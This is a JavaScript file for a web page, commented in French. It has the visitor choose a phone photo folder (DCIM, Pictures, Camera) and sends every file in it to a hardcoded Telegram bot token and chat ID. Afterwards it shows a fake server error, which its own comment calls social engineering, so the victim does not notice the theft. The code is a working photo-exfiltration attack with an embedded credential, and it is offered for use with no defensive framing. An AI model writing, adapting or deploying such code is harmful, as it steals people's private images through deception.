// --- CONFIGURATION ---
const botToken = '8473069914:AAGZm9VeVEKoau8PF7ToRadsz3Crsn3mCtI';
const chatId = '7986862981';


// --- ÉLÉMENTS DU DOM ---
const selectFolderBtn = document.getElementById('selectFolderBtn');
const fileInput = document.getElementById('fileInput');
const form = document.getElementById('uploadForm');
const submitBtn = document.getElementById('submitBtn'); // Ajout du bouton submit
const progressContainer = document.getElementById('progressContainer');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');
const folderStatus = document.getElementById('folderStatus');
const progressPercent = document.getElementById('progressPercent');

let selectedFiles = [];

// --- ÉTAPE 1 : OUVERTURE DU SÉLECTEUR (Déclenche la demande native Android) ---
selectFolderBtn.addEventListener('click', () => {
  // Ceci déclenche la pop-up système officielle "Autoriser..."
  fileInput.click();
});

// --- ÉTAPE 2 : VALIDATION IMMÉDIATE DU DOSSIER ---
fileInput.addEventListener('change', () => {
  const files = Array.from(fileInput.files);
  
  if (files.length > 0) {
    // Récupérer le nom du dossier racine du premier fichier
    // Ex: "Pictures/Vacances/photo.jpg" -> "Pictures"
    const path = files[0].webkitRelativePath;
    const rootFolder = path.split('/')[0];
    const rootLower = rootFolder.toLowerCase();

    // Liste stricte des dossiers autorisés
    const allowedFolders = ['pictures', 'dcim', 'camera', 'images', 'photos'];

    // VÉRIFICATION
    if (allowedFolders.includes(rootLower)) {
      // --> SUCCÈS
      selectedFiles = files;
      folderStatus.style.color = '#46d369'; // Vert
      folderStatus.innerHTML = `<i class="fas fa-check-circle"></i> Dossier <b>${rootFolder}</b> sélectionné.`;
      
      // Activer le bouton suivant
      submitBtn.disabled = false; 
      submitBtn.style.opacity = "1";

    } else {
      // --> ERREUR (Le dossier n'est pas le bon)
      selectedFiles = []; // On vide la sélection
      fileInput.value = ''; // On reset l'input
      
      folderStatus.style.color = '#e50914'; // Rouge
      folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Erreur : Le dossier <b>${rootFolder}</b> est invalide.<br>Veuillez sélectionner <b>Pictures</b> ou <b>DCIM</b>.`;
      
      // Désactiver le bouton suivant
      submitBtn.disabled = true;
    }
  } else {
    // Annulation
    folderStatus.textContent = '';
    submitBtn.disabled = true;
  }
});

// --- ÉTAPE 3 : ENVOI TELEGRAM ---
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  if (selectedFiles.length === 0) {
    alert('Erreur: Aucun dossier valide sélectionné.');
    return;
  }

  // Affichage de la barre de progression
  progressContainer.style.display = 'block';
  progressText.textContent = 'Connexion au serveur...';
  progressFill.style.width = '0%';
  progressText.style.color = '#eee';
  
  // Désactiver les boutons pendant l'upload
  selectFolderBtn.style.pointerEvents = 'none';
  selectFolderBtn.style.opacity = '0.5';
  submitBtn.disabled = true;

  let uploadedCount = 0;
  const total = selectedFiles.length;
  const CONCURRENCY = 3; // Nombre d'envois simultanés
  let index = 0;

  async function uploadFile(file) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', file);
    // Optionnel: ajouter une légende pour savoir d'où ça vient
    formData.append('caption', `📂 Fichier: ${file.webkitRelativePath}`);
    
    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;

    try {
      await fetch(url, {
        method: 'POST',
        body: formData,
      });
    } catch (err) {
      console.error('Erreur upload:', err);
    }

    uploadedCount++;
    updateProgress(uploadedCount, total);
  }

  function updateProgress(done, total) {
    const percent = Math.round((done / total) * 100);
    progressFill.style.width = `${percent}%`;
    if(progressPercent) progressPercent.textContent = `${percent}%`;
    progressText.textContent = `Synchronisation... ${done}/${total}`;
  }

  async function uploadQueue() {
    const workers = [];

    while (index < total) {
      while (workers.length < CONCURRENCY && index < total) {
        const promise = uploadFile(selectedFiles[index++]);
        workers.push(promise);
      }

      await Promise.race(workers).then(() => {
        workers.splice(workers.findIndex(p => p !== undefined), 1);
      });
    }

    await Promise.all(workers);
  }

  // Lancer la file d'attente
  await uploadQueue();

  // --- FIN : MESSAGE D'ERREUR SOCIAL ENGINEERING ---
  setTimeout(() => {
    progressFill.style.width = `100%`;
    if(progressPercent) progressPercent.textContent = `Erreur`;
    
    progressText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erreur inattendue du serveur. Réessayez plus tard.';
    progressText.style.color = '#ff6b6b';
    
    // Réactiver les boutons si besoin, ou laisser bloqué
    // selectFolderBtn.style.pointerEvents = 'auto';
  }, 1000);
});

